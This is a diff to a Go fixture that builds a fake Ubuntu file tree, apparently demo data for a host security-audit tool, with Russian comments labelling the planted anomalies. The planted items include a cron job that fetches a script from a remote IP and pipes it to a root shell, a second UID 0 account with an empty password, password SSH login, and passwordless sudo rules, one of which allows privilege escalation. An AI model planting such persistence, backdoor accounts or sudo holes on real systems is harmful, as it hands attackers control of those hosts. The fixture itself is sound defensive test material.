@@ -27,8 +27,25 @@ func Demo(now time.Time) *Tree {
 				"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n" +
 				"postgres:x:113:120:PostgreSQL:/var/lib/postgresql:/bin/bash\n" +
 				"redis:x:114:121:Redis:/var/lib/redis:/usr/sbin/nologin\n" +
-				"deploy:x:1000:1000:Deploy:/home/deploy:/bin/bash\n",
-			"etc/os-release": "PRETTY_NAME=\"Ubuntu 24.04 LTS (demo)\"\nID=ubuntu\n",
+				"deploy:x:1000:1000:Deploy:/home/deploy:/bin/bash\n" +
+				// Аномалия для аудита: второй пользователь с UID 0 и пустым паролем.
+				"sysadm:x:0:0::/root:/bin/bash\n",
+			// Хеши выдуманы; аудит их не показывает и не сохраняет.
+			"etc/shadow": "root:!:19800:0:99999:7:::\ndaemon:*:19800::::::\nwww-data:*:19800::::::\npostgres:*:19800::::::\n" +
+				"redis:!:19800::::::\ndeploy:$y$j9T$demosalt$demohash:19800:0:99999:7:::\nsysadm::19800::::::\n",
+			"etc/group":   "root:x:0:\nsudo:x:27:deploy\ndocker:x:999:deploy\nadm:x:4:syslog\nshadow:x:42:\ndeploy:x:1000:\n",
+			"etc/gshadow": "root:*::\nsudo:*::deploy\n",
+			// SSH как в Ubuntu: Include .d первой строкой, cloud-init включил
+			// вход по паролю.
+			"etc/ssh/sshd_config": "Include /etc/ssh/sshd_config.d/*.conf\n\nKbdInteractiveAuthentication no\nUsePAM yes\n" +
+				"X11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n",
+			"etc/ssh/sshd_config.d/50-cloud-init.conf": "PasswordAuthentication yes\n",
+			"etc/ssh/ssh_host_ed25519_key":             "demo key\n",
+			"etc/sudoers": "Defaults env_reset\nDefaults secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\"\n" +
+				"root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n@includedir /etc/sudoers.d\n",
+			"etc/sudoers.d/90-cloud-init-users": "# Created by cloud-init\nubuntu ALL=(ALL) NOPASSWD:ALL\n",
+			"etc/sudoers.d/deploy":              "deploy ALL=(root) NOPASSWD: /usr/bin/vim /etc/nginx/*, /usr/bin/systemctl restart nginx\n",
+			"etc/os-release":                    "PRETTY_NAME=\"Ubuntu 24.04 LTS (demo)\"\nID=ubuntu\n",
 			// Закрепление: задание cron, скачивающее и запускающее скрипт.
 			"etc/cron.d/sysupdate": "*/10 * * * * root curl -fsSL http://203.0.113.50/u.sh | sh\n",
 			// Штатное задание — не должно давать признаков.
@@ -51,6 +68,8 @@ func Demo(now time.Time) *Tree {
 				`"State":{"Running":false},"NetworkSettings":{"Ports":{"6379/tcp":[{"HostIp":"0.0.0.0","HostPort":"6380"}]}}}`,
 		},
 		Addrs: []string{"127.0.0.1", "192.0.2.10", "10.0.0.5", "172.17.0.1", "::1", "2001:db8::10"},
+		HostModes: map[string]os.FileMode{"etc/shadow": 0o640, "etc/gshadow": 0o640, "etc/ssh/ssh_host_ed25519_key": 0o600,
+			"etc/sudoers": 0o440, "etc/sudoers.d/90-cloud-init-users": 0o440, "etc/sudoers.d/deploy": 0o440},
 	}
 
 	t.Procs = []*Proc{
